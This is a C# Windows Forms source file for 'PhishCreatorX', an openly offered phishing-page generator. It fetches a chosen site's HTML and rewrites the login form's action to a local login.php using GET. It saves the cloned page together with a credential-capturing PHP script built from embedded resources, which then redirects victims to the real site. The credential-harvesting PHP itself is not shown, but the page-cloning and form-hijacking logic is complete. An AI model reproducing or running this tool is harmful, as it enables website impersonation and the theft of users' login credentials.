using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.IO;
using System.Net;

namespace PhishCreatorX
{
    public partial class frmPhishMain : Form
    {
        private List<string> Websites = new List<string>();
        string Dir = Application.StartupPath;
        public frmPhishMain()
        {
            InitializeComponent();
            this.ShowIcon = false;
        }
        
        private void frmPhishMain_Load(object sender, EventArgs e)
        {
            cmbx_pro_langs.SelectedIndex = 0;
            Load_Websites();
            if (cmbx_urls.Items.Count > 0)
            {
                cmbx_urls.Visible = true;
                cmbx_urls.SelectedIndex = 0;
            }
        }

        private void Load_Websites()
        {
            cmbx_urls.Items.Clear();
            string webs_path = Application.StartupPath + "\\websites";
            if (File.Exists(webs_path))
            {
                string[] urls = File.ReadAllLines(webs_path);
                foreach (string line in urls)
                    if (line.Length > 3)
                    {
                        Websites.Add(line);
                        cmbx_urls.Items.Add(URL_To_Name(line));
                    }
            }
            else return;
            
        }
       
        public  bool Is_Valid_url( string u)
        {
            try
            {
                new Uri(u);
                return true;
            }
            catch
            {
                return false;
            }
        }
        private void textBox1_TextChanged(object sender, EventArgs e)
        {

          btn_submit.Enabled=Is_Valid_url(txbx_url.Text);


        }

        private void Add_New_website()
        {
            bool found = false;
            string websites_path = Application.StartupPath + "\\websites";
            string Webs = File.ReadAllText(websites_path);
            foreach (string site in Websites)
                if (URL_To_Name(site) == URL_To_Name(txbx_url.Text))
                {
                    found = true;
                    break;
                }
            if (!found)
                File.WriteAllText(websites_path, Webs + Environment.NewLine + txbx_url.Text);
        }
        public string URL_To_Name(string url)
        {
            //http://www.ask.fm/yassergersy
            string result = "";
            if (url.Contains("http:") || url.Contains("https:"))
                result = url.Split(new char[] { ':' })[1];
            //www.ask.fm/yassergersy
            if (url.Contains("www.")) 
                result = url.Split(new char[] { '.' })[1];
            //ask.fm/yassergersy
            while(result[0]=='/')
            {
                result=result.Substring(1);
            }
            if (result.Contains("/"))
                result = result.Split(new char[] { '/' })[0];

          return result;
        }

        private void cmbx_urls_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (cmbx_urls.SelectedIndex == -1)
                return;
            txbx_url.Text = Websites[cmbx_urls.SelectedIndex];
        }

        private void btn_Load_dir_Click(object sender, EventArgs e)
        {
            
        }
        public static String Get_Source_code(string Url)
        {
            string result = "";
            
            try
            {
                HttpWebRequest myRequest = (HttpWebRequest)WebRequest.Create(Url);
                myRequest.Method = "GET";
                WebResponse myResponse = myRequest.GetResponse();
                StreamReader sr = new StreamReader(myResponse.GetResponseStream(), System.Text.Encoding.UTF8);
                 result = sr.ReadToEnd();

                 sr.Close();
                 myResponse.Close();
                 return result;
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message,"Phish CreatorX");
                 return null;
            }
        }

        private void btn_submit_Click(object sender, EventArgs e)
        {
            if (txbx_url.Text.Length < 3)
                return;
            if (txbx_Directory.Text.Length < 2)
            {
                MessageBox.Show("Please Select a directory to save in ", "YasserGersy");
                FolderBrowserDialog f = new FolderBrowserDialog();
                if (f.ShowDialog() == DialogResult.OK)
                    txbx_Directory.Text = f.SelectedPath;
            }
            if (txbx_redirect.Text.Length < 3 || Is_Valid_url(txbx_redirect.Text) == false)
                txbx_redirect.Text = txbx_url.Text;
            string websiteName = URL_To_Name(txbx_url.Text);
            Dir = txbx_Directory.Text+ "\\" + websiteName;
          
            string index_path = Dir + "\\index.php";
            string login_path = Dir+"\\login.php";
            
            string Login_source = PhishCreatorX.Properties.Resources.php_script_bef + txbx_redirect.Text + PhishCreatorX.Properties.Resources.php_script_after;
            string index_source = "";

            index_source = Get_Source_code(txbx_url.Text);
            if (index_source == null)
                return;
            index_source = Edit_document(index_source);
            if (index_source == null)
            {

                MessageBox.Show("Can not Found Login Form "+Environment.NewLine+"Make Sure You Provided The right Url","Phish CreatorX");
                return;
            }
         
            if (Directory.Exists(Dir) == false)
              Directory.CreateDirectory(Dir);
            
            //if (!File.Exists(index_path))
             //   File.Create(index_path);
           // if (!File.Exists(login_path))
          //     File.Create(login_path);
            File.WriteAllText(index_path, index_source);
            File.WriteAllText(login_path, Login_source);

            if (MessageBox.Show("Suucceeded ", "PhishCreatorX By Gersy", MessageBoxButtons.YesNo) == DialogResult.Yes)
                System.Diagnostics.Process.Start("explorer", Dir);
            
             Add_New_website();
        }
        private string Edit_document(string content)
        {
            bool FormFounded = false;
            string[] cons = content.Split(new char [] {'<'});
            content=(content[0]=='<')?"<":"";
            foreach (string line in cons) // <form > <h1> g</h1>  | form> h1>
                if(line=="" || line==" ")
                    continue;
                else if (line.Contains("form") && line.Contains("method") && line.Contains("action"))
                {
                    FormFounded = true;
                    string formTag = "";
                    formTag = line.Replace("action", "action='login.php' gen");

                    formTag = formTag.Replace("method", "method='GET' tmp=");
               content+=("<"+formTag+Environment.NewLine);
                    //   content += ("<form method='GET' action='login.php' >" + Environment.NewLine);
                }
                else content += ("<" + line + Environment.NewLine);
            if (FormFounded)
                return content;
            else return null;
        }

        private void button1_Click(object sender, EventArgs e)
        {
        }

        private void button2_Click(object sender, EventArgs e)
        {
        }

        private void button1_Click_1(object sender, EventArgs e)
        {

            }

        private void button1_Click_2(object sender, EventArgs e)
        {
        }

        private void label4_Click(object sender, EventArgs e)
        {
            FolderBrowserDialog f = new FolderBrowserDialog();
            if (f.ShowDialog() == DialogResult.OK)
                txbx_Directory.Text = f.SelectedPath;

        }

        private void panel_twitter_Click(object sender, EventArgs e)
        {

            System.Diagnostics.Process.Start("https://twiiter.com/yassergersy");
        }

        private void panel_fb_Click(object sender, EventArgs e)
        {
            System.Diagnostics.Process.Start("https://facebook.com/prince.gersy2");
        
        }

        private void panelYoutube_Click(object sender, EventArgs e)
        {
            System.Diagnostics.Process.Start("https://youtube.com/gersy.ch2");
        
        }
    }
}
